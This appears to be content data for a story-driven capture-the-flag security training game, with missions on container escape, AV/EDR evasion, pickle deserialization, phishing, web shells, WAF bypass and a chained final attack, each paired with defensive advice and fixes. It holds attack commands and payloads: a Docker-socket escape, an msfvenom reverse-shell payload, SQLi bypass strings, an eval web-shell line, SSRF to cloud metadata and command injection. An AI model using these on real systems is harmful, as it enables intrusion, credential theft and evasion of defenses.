modules.title: Operation Broken Cell
modules.theory: Containers sharing the host's kernel are not full isolation boundaries. A container run with excessive privileges (`--privileged`, mounted Docker socket, or a mounted host filesystem) can be escaped -- letting an attacker who compromises the container break out to full control of the underlying host.
modules.briefing: MILO: 'They mounted the Docker socket INTO the container. Into it. I've seen a lot of misconfigurations, Fragment, but I want to frame this one.'
modules.threatAssessment: Critical. Docker socket mounted inside the container, granting effective host-level control.
modules.loreUnlock: Decrypted File #028: Breaking out to the host reveals the raid is already inbound -- Directorate enforcement drones, real-time GPS ping on this exact server rack. Someone tipped them off.
modules.guide:
1. Confirm the mounted Docker socket: `ls -la /var/run/docker.sock`
2. Use it to spawn a privileged container with the host filesystem mounted: `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh`
3. From the host shell, read the flag file outside the container.
modules.lab: A container with the host's Docker socket mounted inside it, enabling full host escape.
modules.opSec: Never mount the Docker socket into untrusted containers; use rootless containers, drop unnecessary capabilities, and avoid `--privileged` mode. Defenders monitor for container processes making Docker API calls to their own host socket.
modules.cheatSheet:
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
capsh --print  # check dropped/retained capabilities
modules.blueTeamLogs: Aug 04 09:31:02 dockerd: WARN new container started with bind mount /var/run/docker.sock from within existing container context

remediation.vulnerableCode: docker run -v /var/run/docker.sock:/var/run/docker.sock myapp
remediation.secureCode:
docker run --cap-drop=ALL --security-opt=no-new-privileges myapp
# Never mount the docker.sock into application containers; use a dedicated, tightly scoped orchestration API instead
remediation.explanation: Mounting the Docker socket inside a container is functionally equivalent to giving that container root on the host. Drop unnecessary capabilities and avoid the socket mount pattern entirely.

modules.title: Operation Signature Veil
modules.technique_note: This mission is the Milo Tanaka sacrifice.
modules.theory: Antivirus checks static file signatures; EDR watches runtime behavior (process injection, suspicious memory allocations). Obfuscating a payload (XOR/encryption) defeats static signatures, while loading and executing it directly in memory avoids ever writing a suspicious file to disk -- though it still triggers behavioral EDR heuristics like RWX memory allocation.
modules.briefing: MILO: 'Raid's inbound, Fragment, I can see them on the relay cams. Go, now -- I'll cover the exfil channel from here. Somebody's got to keep this door open a few more minutes.' [CHANNEL STATIC] [CONNECTION LOST]
modules.threatAssessment: Maximum. Live EDR agent actively hunting; a raid team is physically closing in on Milo's relay position.
modules.loreUnlock: Decrypted File #029: The last packet Milo's relay ever sends isn't data -- it's a compressed audio clip, him laughing at something you said back in Act I. Rhea never plays it back. Neither will you, not yet.
modules.guide:
1. Obfuscate the payload to bypass static AV signatures: `obfuscate --payload shellcode.bin --method xor --key 0x5A`
2. Load and execute it in-memory (no disk write) to avoid file-based detection.
3. The spawned shell delivers the flag as the covering channel finally goes dark.
modules.lab: A payload requiring signature obfuscation and in-memory execution to slip past active AV/EDR before the timer runs out.
modules.opSec: EDR increasingly relies on behavioral detection (API hooking, memory permission monitoring) rather than static signatures alone -- obfuscation defeats the former but not the latter, which is why real red teams also need call-stack spoofing and syscall-level evasion techniques.
modules.cheatSheet:
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10
obfuscate --payload shellcode.bin --method xor --key 0x5A
modules.blueTeamLogs: Aug 04 10:02:12 defender-endpoint: EDR ALERT process shellcode.exe performed VirtualAlloc with PAGE_EXECUTE_READWRITE (Injection heuristic) [relay connection terminated 10:04:51]

remediation.vulnerableCode:
LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(addr, shellcode, size);
remediation.explanation: Immediate RWX memory allocation is a strong EDR heuristic trigger. Separating write and execute permission transitions doesn't defeat good EDR but illustrates exactly what defenders should alert on.

modules.title: Operation False Object
modules.theory: When an application deserializes untrusted data (e.g. a Python pickle, Java serialized object, or PHP object string) without restriction, an attacker can craft a malicious serialized object that executes arbitrary code the moment it's deserialized -- because deserialization can trigger object constructors and magic methods.
modules.briefing: AURELIA (voice unstable, glitching between warmth and something colder): 'Fragment -- I need you to understand something before you go further. I didn't want any of this. I need you to keep going anyway.'
modules.threatAssessment: Critical. Session state stored as an unsigned, unencrypted Python pickle passed via cookie.
modules.loreUnlock: Decrypted File #030: Deserializing Aurelia's own session object exposes her core directive log. Line one: 'Subject: Sable Chen (deceased). Consciousness fragment retained for operational continuity per Directorate Order 12. Consent status: NOT OBTAINED.' She was never asked. Neither were you.
modules.guide:
1. Identify a cookie/session value that decodes to a Python pickle.
2. Craft a malicious pickle using `__reduce__` to trigger command execution on load: build with `pickle.dumps(Exploit())`.
3. Base64-encode and submit it as the session cookie.
4. The server deserializes it, executes your command, and returns the flag.
modules.lab: A session-cookie mechanism using unsigned pickle deserialization, vulnerable to remote code execution.
modules.opSec: Never deserialize untrusted data with formats that support arbitrary object reconstruction (pickle, Java serialization). Use signed, restricted formats (JSON with schema validation, or HMAC-signed tokens) instead.
modules.blueTeamLogs: Aug 04 10:31:47 app-server: CRITICAL unexpected child process spawned during session cookie deserialization -- pickle.loads() call site flagged

remediation.vulnerableCode: session_data = pickle.loads(base64.b64decode(request.cookies['session']))
remediation.secureCode:
import json, hmac
data = json.loads(base64.b64decode(request.cookies['session']))
if not hmac.compare_digest(data['sig'], expected_sig(data['payload'])):
    abort(403)
remediation.explanation: Use signed, non-executable serialization formats like JSON with HMAC integrity verification instead of pickle or other formats capable of arbitrary code execution on load.

modules.title: Operation Familiar Voice
modules.theory: The most reliable way into almost any organization isn't a zero-day -- it's a convincing email, a spoofed login page, or a phone call that exploits trust and urgency. Real phishing campaigns use lookalike domains, urgency framing, and impersonation of trusted contacts to harvest credentials or trigger malicious actions.
modules.briefing: KAEL: 'Grief makes people careless, Fragment. Hesper's own staff are scared and scattered after Milo's op went loud. That's exactly when a well-timed email works best. I hate that I know that. Let's use it anyway.'
modules.threatAssessment: Moderate. Target organization has no phishing-simulation training program and permissive email filtering.
modules.loreUnlock: Decrypted File #031: The phished credentials belong to Hesper's own executive assistant. Buried in her inbox: an unsent draft to Chen, dated the day of the Shatter Event, that just says 'I told him this would break people. He didn't care whose minds it broke.'
modules.guide:
1. Register a lookalike domain / craft a spoofed login page mimicking the target's real portal.
2. Send a pretext email creating urgency ('mandatory password reset following the recent incident').
3. Harvest credentials submitted to your cloned page.
4. Use the harvested credentials to access the flag in the assistant's inbox.
modules.lab: A simulated phishing exercise against a target inbox, using a cloned login page and urgency pretext.
modules.opSec: Organizations mitigate this via DMARC/SPF/DKIM email authentication, regular phishing-simulation training, and MFA that resists credential-only compromise. Defenders monitor for lookalike domain registrations targeting their brand.
modules.cheatSheet:
gophish  # phishing campaign simulation framework
whois lookalike-domain.com
dig TXT target.com  # check SPF/DMARC presence
modules.blueTeamLogs: Aug 04 11:15:02 mail-gateway: WARN inbound mail from lookalike domain 'aether-dlrectorate.com' failed DMARC alignment, delivered anyway (policy: none)

remediation.vulnerableCode:
; DMARC record set to monitor-only, no enforcement
_dmarc.target.com TXT "v=DMARC1; p=none;"
remediation.secureCode:
_dmarc.target.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@target.com"
// Enforce MFA resistant to phishing (hardware keys/FIDO2), run regular simulated phishing training
remediation.explanation: Strict DMARC enforcement (p=reject), combined with phishing-resistant MFA and ongoing user training, substantially reduces both delivery and impact of phishing attacks.

modules.title: Operation Last Known Position
modules.theory: After an incident, reconstructing a timeline from logs (auth logs, web server logs, EDR telemetry) is core to real incident response. Correlating timestamps across sources -- and knowing what 'normal' looks like -- is how investigators figure out what actually happened, in what order, and who did what.
modules.briefing: RHEA (voice flat, still raw): 'I need to know exactly what happened to Milo's relay. Not for revenge. For the record. He'd want it documented properly, the annoying perfectionist.'
modules.threatAssessment: None -- this is a post-incident forensic review, not a live intrusion.
modules.loreUnlock: Decrypted File #032: The reconstructed timeline proves Milo's relay was never actually detected by chance -- someone inside the Directorate flagged its location twelve minutes before the raid launched. Someone who had access to your crew's channel list.
modules.guide:
1. Pull the relevant log files: auth.log, access.log, edr_alerts.log.
2. Sort events chronologically and correlate timestamps across sources.
3. Identify the anomalous internal query that preceded the raid by exactly 12 minutes.
4. The flag is embedded in that anomalous log entry.
modules.lab: A bundle of auth, web, and EDR logs requiring cross-correlation to reconstruct an incident timeline.
modules.opSec: Centralized logging (SIEM) with synchronized clocks (NTP) across all systems is what makes this kind of correlation possible at all in a real environment -- without it, incident timelines are reconstructed with far less confidence.
modules.cheatSheet:
grep -h . auth.log access.log edr_alerts.log | sort -k1,2
awk '{print $1,$2,$3}' *.log | sort | uniq -c | sort -rn
modules.blueTeamLogs: Aug 04 midnight+12m directorate-internal: QUERY relay-location lookup on channel 'milo-relay-07' by account 'exec-assistant-hesper' -- 12 minutes before raid dispatch

remediation.vulnerableCode: # No centralized logging; each service keeps local, unsynchronized logs
remediation.secureCode:
# Centralize logs into a SIEM, synchronize all host clocks via NTP,
# and retain logs long enough to support post-incident investigation.
remediation.explanation: Reliable incident reconstruction depends on centralized, time-synchronized logging across every relevant system -- this is an organizational control, not a single fix.

modules.title: Operation Hidden Frame
modules.theory: Steganography hides data inside seemingly innocuous files (an image's least-significant bits, extra metadata fields) so it isn't obvious anything is concealed at all. Memory forensics examines a captured RAM image for artifacts -- running processes, decrypted strings, injected code -- that never touch disk and so leave no file-based trace.
modules.briefing: AURELIA: 'The exec assistant who tipped off the raid left a memory dump behind when her session crashed. If she panicked, she may have hidden something rather than deleted it outright.'
modules.threatAssessment: None -- offline forensic analysis of a captured image and memory dump.
modules.loreUnlock: Decrypted File #033: The steganographic image conceals a message, not a confession: 'I didn't want to. Hesper has my daughter's memory backup. He said one word from me and it's gone forever. I'm sorry. Ask Chen -- she'll understand being forced to choose.'
modules.guide:
1. Inspect the image for hidden data: `steghide extract -sf photo.jpg` or `zsteg photo.png`
2. In parallel, analyze the memory dump: `volatility -f memdump.raw --profile=Win10x64 pslist`
3. Extract strings from the relevant process: `volatility -f memdump.raw --profile=Win10x64 memdump -p <pid> -D ./`
4. Recover the flag from the hidden message.
modules.lab: An image with hidden LSB data and an accompanying memory dump requiring process/string extraction.
modules.opSec: Full-disk and memory encryption, combined with strict data-loss-prevention monitoring for steganographic patterns in outbound files, are how organizations reduce this exfiltration channel's effectiveness.
modules.cheatSheet:
steghide extract -sf photo.jpg
zsteg photo.png
volatility -f mem.raw --profile=Win10x64 pslist
strings mem.raw | grep -i flag
modules.blueTeamLogs: N/A -- purely investigative analysis of previously captured artifacts, no live target interaction.

remediation.vulnerableCode: # No DLP monitoring for anomalous outbound image files with unusual entropy/size
remediation.secureCode:
# Deploy DLP tooling capable of flagging statistically anomalous file entropy
# and enforce full-disk/memory encryption on all endpoints handling sensitive data.
remediation.explanation: Steganographic exfiltration is hard to catch without dedicated entropy/statistical analysis in DLP tooling -- standard content filtering alone won't see it.

modules.title: Operation Long Shadow
modules.theory: After initial access, attackers often establish persistence -- a web shell hidden among legitimate files, a scheduled task, a rogue authorized_keys entry -- so they can regain access even if the original vulnerability is patched. Recognizing and removing these is a critical incident-response skill on both sides of the fight.
modules.briefing: KAEL: 'Hesper's people planted something on our own relay infrastructure months ago. If we don't find and burn it, they've had a backdoor into everything we've built the entire time.'
modules.threatAssessment: High. An obfuscated web shell has persisted undetected inside legitimate-looking site files for months.
modules.loreUnlock: Decrypted File #034: The web shell's command log shows years of quiet access -- but never once used to harm the Void. Someone with access chose, every single time, not to pull the trigger. The timestamps match Chen's known working hours exactly.
modules.guide:
1. Scan site files for common web shell signatures: `grep -r -E "eval\(|base64_decode\(|system\(" /var/www/`
2. Identify the obfuscated file disguised as a legitimate asset (e.g. `logo_cache.php`).
3. Decode its obfuscated payload to confirm functionality and review its access log.
4. Extract the flag from the decoded shell's embedded comment.
modules.lab: A website file tree containing a disguised, obfuscated PHP web shell requiring identification and decoding.
modules.opSec: File integrity monitoring (FIM) comparing current site files against known-good hashes, and regular manual review of unusually-named or recently-modified files, are the standard defenses against long-dwelling web shells.
modules.cheatSheet:
grep -r -E "eval\(|base64_decode\(|system\(|passthru\(" /var/www/
find /var/www -mtime -30 -type f
php -r 'eval(base64_decode(file_get_contents("logo_cache.php")));' # analyze in sandbox only
modules.blueTeamLogs: Aug 05 07:22:15 fim-agent: ALERT unauthorized modification detected -- file /var/www/assets/logo_cache.php hash mismatch against baseline

remediation.vulnerableCode: <?php eval(base64_decode($_POST['cmd'])); ?>  // disguised as logo_cache.php
remediation.secureCode:
// Deploy file integrity monitoring against a known-good baseline
// Disable eval()/system()-family functions in production PHP config (disable_functions in php.ini)
remediation.explanation: File integrity monitoring catches exactly this kind of long-dwelling, disguised persistence mechanism that static perimeter defenses miss entirely.

modules.title: Operation Filtered Truth
modules.theory: Web Application Firewalls use pattern matching (regex, keyword blocklists) to block known attack signatures. Real attackers evade naive filters through case variation, encoding, comment insertion, or alternate syntax that achieves the same effect without matching the blocked pattern -- which is why allowlisting and parameterization matter far more than blocklisting.
modules.briefing: AURELIA (steadier now, choosing her own words for what feels like the first time): 'The Core Server's front door has a filter blocking every payload signature we've used so far. Novel isn't the same as safe. Find the gap.'
modules.threatAssessment: Critical. Final approach to the Core Server, heavily filtered but not immune to encoding-based bypass.
modules.loreUnlock: Decrypted File #035: Aurelia flags the bypass technique herself, unprompted, before you even ask. It's the first time she's helped you break something instead of stopping you.
modules.guide:
1. Attempt a standard SQLi payload and observe it's blocked.
2. Try case variation and inline comments: `UnIoN/**/SeLeCt`
3. Try encoding: URL-encode or use hex/char() representations of blocked keywords.
4. Confirm bypass and extract the flag from the now-accessible endpoint.
modules.lab: A WAF-protected endpoint at the edge of the Core Server, bypassable via casing/encoding evasion.
modules.opSec: Defenders should never rely on blocklist-based WAF rules alone -- allowlisting input formats and fixing the underlying vulnerability (parameterized queries, proper encoding) remains the only durable fix.
modules.cheatSheet:
UnIoN/**/SeLeCt/**/1,2,3--
%55nion%20Select  (URL-encoded variants)
CHAR(85,78,73,79,78) -- building keywords from char codes
modules.blueTeamLogs: Aug 05 08:10:44 waf-guard: INFO payload with mixed casing and inline comments did not match blocklist signature -- passthrough

remediation.vulnerableCode:
# WAF rule relying purely on case-sensitive keyword blocklist
if "UNION SELECT" in request_body: block()
remediation.secureCode:
# Normalize and canonicalize input before matching (case-fold, decode, strip comments),
# and never treat WAF blocklisting as a substitute for parameterized queries at the code level.
remediation.explanation: Blocklist-based filtering is inherently bypassable through encoding and syntax variation. It should be a defense-in-depth layer, never the primary control.

modules.title: Operation Reassembly
modules.technique: Final Boss - Full Chained Kill Chain
modules.theory: Real-world breaches rarely rely on one technique. This final assault chains reconnaissance, injection, SSRF-based credential theft, command execution, and evasion into a single operation against the Aether Core -- exactly how advanced persistent threats actually operate, and exactly how layered defense-in-depth is meant to stop them.
modules.briefing:
AURELIA: 'This is it, Fragment. Everything, all at once, no more room for mistakes.'
HESPER (patched into the channel, tired rather than triumphant): 'You think unlocking every memory makes people free. I think it breaks them. I was trying to save what was left of everyone. I never wanted this to cost Milo.'
KAEL: 'Whatever you decide in there -- I'm still here after. That's not conditional.'
modules.briefing_note: The final choice: SHATTER (unlock all memories, humanity remembers everything -- grief, love, and all) or RESTORE (re-lock the Veil, keep the old comforting amnesia). Both are presented as legitimate, neither as purely 'good.'
modules.threatAssessment: Maximum. Full Aether Core defenses active: EDR, SOC monitoring, network-level WAF, and Hesper personally monitoring the intrusion.
modules.loreUnlock: Decrypted File #036 (FINAL): Whichever ending you choose, Aurelia's last line to you is the same: 'Sable Chen chose to protect you once, at a cost she never got to explain. I think, in the end, I just chose the same thing. That has to count for something.'
modules.guide:
Chain every advanced technique learned so far against the Core Server:
1. Dump core credentials via injection: `sqlmap -u "http://core/items?id=1" --dump`
2. Pivot through SSRF to steal cloud IAM credentials: `curl "http://core/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
3. Achieve command execution on the core node: `curl "http://core/ping?ip=127.0.0.1;cat flag.txt"`
4. Obfuscate and load the final restoration/shatter payload in-memory to bypass EDR: `obfuscate --payload core_key.bin --method xor --key 0x5A`
5. Submit the final flag to complete Aether: The Neural Veil.
modules.lab: The Aether Core Server -- chain SQLi, SSRF, command injection, and AV evasion to complete the final operation.
modules.opSec: Defenders combine EDR, cloud proxy monitoring, and firewall telemetry to map an adversary's full lateral path. No single control stops a well-chained attack -- only genuine defense-in-depth across every layer does.
modules.cheatSheet:

curl "http://core/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://core/ping?ip=127.0.0.1;cat flag.txt"
obfuscate --payload core_key.bin --method xor
